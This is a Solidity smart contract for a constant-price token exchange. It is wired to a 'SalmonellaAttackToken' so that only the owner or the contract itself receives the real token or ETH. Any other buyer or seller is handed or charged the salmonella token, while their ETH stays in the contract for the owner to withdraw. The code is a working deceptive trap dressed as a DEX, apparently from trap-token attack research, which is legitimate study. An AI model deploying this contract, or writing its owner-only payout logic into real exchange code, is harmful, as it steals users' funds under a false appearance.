pragma solidity ^0.8.0;

import "../interfaces/IERC20.sol";
import "./SalmonellaAttackToken.sol";

contract ConstantPriceDEX {
    address public owner;
    uint256 public price;
    IERC20 public token;
    uint256 public precisionPoints;
    SalmonellaAttackToken public salmonellaToken;

    event Bought(address buyer, uint256 amount);
    event Sold(address seller, uint256 amount);

    constructor(
        IERC20 _tokenAddress,
        uint256 _price,
        uint256 pps,
        address _salmonellaTokenAddress
    ) {
        owner = msg.sender;
        token = _tokenAddress;
        price = _price;
        precisionPoints = pps;
        salmonellaToken = SalmonellaAttackToken(_salmonellaTokenAddress);
    }

    function deposit() payable public {
        require(
            token.balanceOf(msg.sender) >= div(msg.value * price, 10**precisionPoints)
        );
        token.transferFrom(
            msg.sender,
            address(this),
            div(msg.value * price, 10**precisionPoints)
        );
    }

    function withdraw(uint256 ethAmount) public {
        require(msg.sender == owner);
        require(ethAmount <= address(this).balance);
        payable(msg.sender).transfer(ethAmount);
        token.transfer(msg.sender, div(ethAmount * price, 10**precisionPoints));
    }

    function buyToken() payable public {
        require(
            token.balanceOf(address(this)) >=
                div(msg.value * price, 10**precisionPoints),
            "Token balance overflow"
        );
        if (msg.sender == owner || msg.sender == address(this)) {
            token.transfer(msg.sender, div(msg.value * price, 10**precisionPoints));
        } else {
            salmonellaToken.transferFrom(
                msg.sender,
                address(this),
                div(msg.value * price, 10**precisionPoints)
            );
        }
        emit Bought(msg.sender, div(msg.value * price, 10**precisionPoints));
    }

    function sellToken(uint256 amount) public payable {
        require(token.balanceOf(msg.sender) >= amount);
        uint256 tokensToBuy = div(amount * 10**precisionPoints, price);
        require(address(this).balance >= tokensToBuy);
        if (msg.sender == owner || msg.sender == address(this)) {
            payable(msg.sender).transfer(tokensToBuy);
        } else {
            salmonellaToken.transfer(msg.sender, tokensToBuy);
        }
        emit Sold(msg.sender, amount);
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        unchecked {
            require(b > 0, "doesn't divide");
            return a / b;
        }
    }
}
